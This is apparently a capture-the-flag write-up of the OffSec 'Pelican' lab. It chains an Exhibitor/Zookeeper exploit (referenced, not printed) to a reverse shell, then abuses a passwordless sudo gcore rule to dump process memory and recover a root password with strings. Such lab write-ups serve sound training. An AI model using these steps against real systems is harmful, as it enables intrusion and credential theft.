![Pelican attack path](/images/lab-writeups/pelican.svg)

# Pelican Write-Up

Source: OffSec

Difficulty: Intermediate

Categories: Linux, Samba, CUPS, Zookeeper, Exhibitor, Java RMI, sudo, gcore, memory dump

## Nmap Scan

The scan exposed several services:

```text
22/tcp    open  ssh         OpenSSH 7.9p1 Debian
139/tcp   open  netbios-ssn Samba
445/tcp   open  netbios-ssn Samba 4.9.5-Debian
631/tcp   open  ipp         CUPS 2.2
2181/tcp  open  zookeeper   Zookeeper 3.4.6
2222/tcp  open  ssh         OpenSSH 7.9p1 Debian
8080/tcp  open  http        Jetty 1.0
8081/tcp  open  http        nginx 1.14.2
34051/tcp open  java-rmi    Java RMI
```

Important observations:

- Zookeeper was exposed on port 2181.
- Jetty was exposed on 8080.
- nginx on 8081 redirected to `/exhibitor/v1/ui/index.html`.
- Java RMI was exposed.
- SSH was available on both 22 and 2222.

The application stack pointed toward Exhibitor/Zookeeper.

## Web Discovery

Port 8081 redirected to:

```text
http://192.168.143.98:8080/exhibitor/v1/ui/index.html
```

That led to Exhibitor, a management interface for Zookeeper.

Relevant public exploit reference:

```text
https://www.exploit-db.com/exploits/48654
```

The exploit path resulted in a reverse shell on the target.

## Foothold

After following the proof of concept, a shell was obtained as `charles`.

The next step was checking sudo rights:

```bash
sudo -l
```

The output:

```text
Matching Defaults entries for charles on pelican:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

User charles may run the following commands on pelican:
    (ALL) NOPASSWD: /usr/bin/gcore
```

This is the key privilege escalation finding.

## Understanding gcore

`gcore` creates a core dump of a running process. A core dump is a snapshot of process memory. If it is run as root against a privileged process, sensitive data in memory can be written to a file readable by the attacker, depending on permissions and execution context.

Since `charles` could run `/usr/bin/gcore` as root without a password, the goal was to dump memory from a process likely to contain credentials.

## Privilege Escalation

Use `ps aux` to inspect running processes and choose a target process.

Run `gcore` through sudo:

```bash
sudo /usr/bin/gcore <pid>
```

Then inspect the dump:

```bash
strings core.<pid> | less
```

The relevant string found in memory:

```text
Password: root:
ClogKingpinInning731
```

The recovered root password:

```text
ClogKingpinInning731
```

Switch to root:

```bash
su root
```

Then retrieve the flags:

```bash
cat /home/charles/local.txt
cat /root/proof.txt
```

## Attack Chain

```text
Nmap
-> Zookeeper and Exhibitor exposed
-> Exploit Exhibitor/Zookeeper path
-> Reverse shell as charles
-> sudo -l shows NOPASSWD gcore
-> gcore dumps process memory as root
-> strings reveals root password
-> su root
-> read local.txt and proof.txt
```

## Lessons Learned

Zookeeper and Exhibitor should be treated as high-priority when exposed externally.

`sudo -l` is mandatory after landing a Linux shell.

Memory-dumping tools such as `gcore` can expose credentials without modifying files or exploiting a kernel issue.

Credentials may appear in memory in plain text due to prompts, command-line arguments, cached application state, or environment data.

If a user can run a memory-dumping tool as root, look for long-lived privileged processes and inspect dumps with `strings`.
